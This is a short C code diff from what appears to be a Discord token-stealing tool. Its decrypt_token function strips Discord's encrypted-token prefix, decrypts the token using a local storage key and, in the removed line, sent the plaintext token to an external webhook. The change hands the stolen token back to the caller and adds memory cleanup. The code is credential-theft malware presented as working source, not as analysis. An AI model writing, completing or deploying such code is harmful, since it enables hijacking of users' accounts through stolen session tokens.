@@ -9,7 +9,7 @@
 
 extern webhook webhook_details;
 int decrypt_token(char *encrypted_token, const char *local_storage_key,
-		  int local_storage_key_size)
+		  int local_storage_key_size, char **decrypted_token_out)
 {
 	encrypted_token += strlen("dQw4w9WgXcQ:"); // skip this
 	DWORD token_size = 0;
@@ -25,11 +25,16 @@ int decrypt_token(char *encrypted_token, const char *local_storage_key,
 		ERROR_PRINT("Failed to decrypt token\n");
 		goto fail;
 	}
-	execute_webhook(&webhook_details, decrypted_token);
-
+	
+	*decrypted_token_out = decrypted_token;
+	free(token_bytes);
 	return 0;
+
 fail:
 	free(token_bytes);
+	if (decrypted_token) {
+		free(decrypted_token);
+	}
 	return 1;
 }
 
